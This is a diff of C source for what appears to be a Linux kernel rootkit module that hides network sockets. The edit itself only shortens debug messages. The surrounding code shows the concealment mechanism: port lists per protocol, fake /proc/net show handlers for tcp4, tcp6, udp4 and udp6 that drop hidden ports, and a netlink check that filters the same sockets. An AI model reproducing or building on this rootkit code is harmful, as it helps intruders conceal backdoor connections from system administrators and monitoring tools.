@@ -28,22 +28,22 @@ struct data_node **socket_get_list(char *protocol) {
 	/* get node for specific protocol */
 	if(!strcmp(protocol, "tcp4")) {
 
-		debug("[ socket_get_list ] LIST IS TCP4");
+		debug("LIST IS TCP4");
 
 		return &tcp_node;
 	}else if(!strcmp(protocol, "tcp6")) {
 
-		debug("[ socket_get_list ] LIST IS TCP6");
+		debug("LIST IS TCP6");
 
 		return &tcp6_node;
 	}else if(!strcmp(protocol, "udp4")) {
 
-		debug("[ socket_get_list ] LIST IS UDP4");
+		debug("LIST IS UDP4");
 
 		return &udp_node;
 	}else if(!strcmp(protocol, "udp6")) {
 
-		debug("[ socket_get_list ] LIST IS UDP6");
+		debug("LIST IS UDP6");
 
 		return &udp6_node;
 	}
@@ -56,7 +56,7 @@ void insert_socket(struct data_node **head, int port) {
 	/* kmalloc for size of int */
 	int *sn = kmalloc(sizeof(int), GFP_KERNEL);
 
-	debug("[ insert_socket ] INSERT NEW PORT %d", port);
+	debug("INSERT NEW PORT %d", port);
 
 	/* set port */
 	*sn = port;
@@ -73,7 +73,7 @@ void remove_socket(struct data_node **head, int port) {
 
 		int *sn = (int *)node->data;
 
-		debug("[ remove_socket ] PORT %d IN LIST, REMOVE PORT", port);
+		debug("PORT %d IN LIST, REMOVE PORT", port);
 
 		/* free int */
 		kfree(sn);
@@ -84,7 +84,7 @@ void remove_socket(struct data_node **head, int port) {
 		return;
 	}
 
-	debug("[ remove_socket ] PORT %d NOT IN LIST", port);
+	debug("PORT %d NOT IN LIST", port);
 }
 
 int find_socket(struct data_node **head, int port) {
@@ -102,7 +102,7 @@ int fake_tcp4_show(struct seq_file *m, void *v) {
 
 	if(SEQ_START_TOKEN == v) {
 
-		debug("[ fake_tcp4_show ] SEQ_START_TOKEN == v, DROP");
+		debug("SEQ_START_TOKEN == v, DROP");
 
 		/* early return, decrease counter */
 		dec_critical(&lock_tcp4, &accesses_tcp4);
@@ -115,7 +115,7 @@ int fake_tcp4_show(struct seq_file *m, void *v) {
 
 	if(find_socket(&tcp_node, port)) {
 
-		debug("[ fake_tcp4_show ] PORT %d IN LIST, DROP", port);
+		debug("PORT %d IN LIST, DROP", port);
 
 		/* early return, decrease counter */
 		dec_critical(&lock_tcp4, &accesses_tcp4);
@@ -123,7 +123,7 @@ int fake_tcp4_show(struct seq_file *m, void *v) {
 		return 0;
 	}
 
-	debug("[ fake_tcp4_show ] PORT %d NOT IN LIST", port);
+	debug("PORT %d NOT IN LIST", port);
 
 	/* decrease counter */
 	dec_critical(&lock_tcp4, &accesses_tcp4);
@@ -141,7 +141,7 @@ int fake_tcp6_show(struct seq_file *m, void *v) {
 
 	if(SEQ_START_TOKEN == v) {
 
-		debug("[ fake_tcp6_show ] SEQ_START_TOKEN == v, DROP");
+		debug("SEQ_START_TOKEN == v, DROP");
 
 		/* early return, decrease counter */
 		dec_critical(&lock_tcp6, &accesses_tcp6);
@@ -154,7 +154,7 @@ int fake_tcp6_show(struct seq_file *m, void *v) {
 
 	if(find_socket(&tcp6_node, port)) {
 
-		debug("[ fake_tcp6_show ] PORT %d IN LIST, DROP", port);
+		debug("PORT %d IN LIST, DROP", port);
 
 		/* early return, decrease counter */
 		dec_critical(&lock_tcp6, &accesses_tcp6);
@@ -162,7 +162,7 @@ int fake_tcp6_show(struct seq_file *m, void *v) {
 		return 0;
 	}
 
-	debug("[ fake_tcp6_show ] PORT %d NOT IN LIST", port);
+	debug("PORT %d NOT IN LIST", port);
 
 	/* decrease counter */
 	dec_critical(&lock_tcp6, &accesses_tcp6);
@@ -180,7 +180,7 @@ int fake_udp4_show(struct seq_file *m, void *v) {
 
 	if(SEQ_START_TOKEN == v) {
 
-		debug("[ fake_udp4_show ] SEQ_START_TOKEN == v, DROP");
+		debug("SEQ_START_TOKEN == v, DROP");
 
 		/* early return, decrease counter */
 		dec_critical(&lock_udp4, &accesses_udp4);
@@ -193,7 +193,7 @@ int fake_udp4_show(struct seq_file *m, void *v) {
 
 	if(find_socket(&udp_node, port)) {
 
-		debug("[ fake_udp4_show ] PORT %d IN LIST, DROP", port);
+		debug("PORT %d IN LIST, DROP", port);
 
 		/* early return, decrease counter */
 		dec_critical(&lock_udp4, &accesses_udp4);
@@ -201,7 +201,7 @@ int fake_udp4_show(struct seq_file *m, void *v) {
 		return 0;
 	}
 
-	debug("[ fake_udp4_show ] PORT %d NOT IN LIST", port);
+	debug("PORT %d NOT IN LIST", port);
 
 	/* decrease counter */
 	dec_critical(&lock_udp4, &accesses_udp4);
@@ -219,7 +219,7 @@ int fake_udp6_show(struct seq_file *m, void *v) {
 
 	if(SEQ_START_TOKEN == v) {
 
-		debug("[ fake_udp6_show ] SEQ_START_TOKEN == v, DROP");
+		debug("SEQ_START_TOKEN == v, DROP");
 
 		/* early return, decrease counter */
 		dec_critical(&lock_udp6, &accesses_udp6);
@@ -232,7 +232,7 @@ int fake_udp6_show(struct seq_file *m, void *v) {
 
 	if(find_socket(&udp6_node, port)) {
 
-		debug("[ fake_udp6_show ] PORT %d IN LIST, DROP", port);
+		debug("PORT %d IN LIST, DROP", port);
 
 		/* early return, decrease counter */
 		dec_critical(&lock_udp6, &accesses_udp6);
@@ -240,7 +240,7 @@ int fake_udp6_show(struct seq_file *m, void *v) {
 		return 0;
 	}
 
-	debug("[ fake_udp6_show ] PORT %d NOT IN LIST", port);
+	debug("PORT %d NOT IN LIST", port);
 
 	/* decrease counter */
 	dec_critical(&lock_udp6, &accesses_udp6);
@@ -260,7 +260,7 @@ int socket_check(struct nlmsghdr *hdr) {
 
 	if(find_socket(&tcp_node, port) || find_socket(&tcp6_node, port) || find_socket(&udp_node, port) || find_socket(&udp6_node, port)) {
 
-		debug("[ socket_check ] PORT %d IN ONE LIST, NEEDS TO BE HIDDEN", port);
+		debug("PORT %d IN ONE LIST, NEEDS TO BE HIDDEN", port);
 
 		return 1;
 	}
@@ -341,14 +341,14 @@ void socket_hide(char *protocol, int port) {
 	/* no valid socket type */
 	if(node == NULL) {
 
-		debug("[ socket_hide ] UNKNOWN PROTOCOL");
+		debug("UNKNOWN PROTOCOL");
 
 		return;
 	}
 
 	if(!find_socket(node, port)) {
 
-		debug("[ socket_hide ] PORT %d NOT IN LIST, INSERT NEW PORT", port);
+		debug("PORT %d NOT IN LIST, INSERT NEW PORT", port);
 
 		/* port for protocol not hidden, save in list */
 		insert_socket(node, port);
@@ -356,7 +356,7 @@ void socket_hide(char *protocol, int port) {
 		return;
 	}
 
-	debug("[ socket_hide ] PORT %d ALREADY IN LIST", port);
+	debug("PORT %d ALREADY IN LIST", port);
 }
 
 void socket_unhide(char *protocol, int port) {
@@ -367,14 +367,14 @@ void socket_unhide(char *protocol, int port) {
 	/* no valid socket type */
 	if(node == NULL) {
 
-		debug("[ socket_unhide ] UNKNOWN PROTOCOL");
+		debug("UNKNOWN PROTOCOL");
 
 		return;
 	}
 
 	if(find_socket(node, port)) {
 
-		debug(" socket_unhide ] PORT %d IN LIST, REMOVE PORT", port);
+		debug("PORT %d IN LIST, REMOVE PORT", port);
 
 		/* port for protocol found, remove from list */
 		remove_socket(node, port);
@@ -382,7 +382,7 @@ void socket_unhide(char *protocol, int port) {
 		return;
 	}
 
-	debug("[ socket_unhide ] PORT %d NOT IN LIST", port);
+	debug("PORT %d NOT IN LIST", port);
 
 }
 
@@ -409,7 +409,7 @@ int socket_hiding_init(void) {
 	struct rb_node *proc_node_current = rb_first(root);
 	struct rb_node *proc_node_last = rb_last(root);
 
-	debug("[ socket_hiding_init ] INITIALIZE SOCKET HIDING");
+	debug("INITIALIZE SOCKET HIDING");
 
 	/* initialize mutex */
 	mutex_init(&lock_recvmsg);
@@ -478,7 +478,7 @@ void socket_hiding_exit(void) {
 	struct rb_node *proc_node_current = rb_first(root);
 	struct rb_node *proc_node_last = rb_last(root);
 
-	debug("[ socket_hiding_exit ] EXIT SOCKET HIDING");
+	debug("EXIT SOCKET HIDING");
 
 	/* free socket lists */
 	free_data_node_list(&tcp_node);
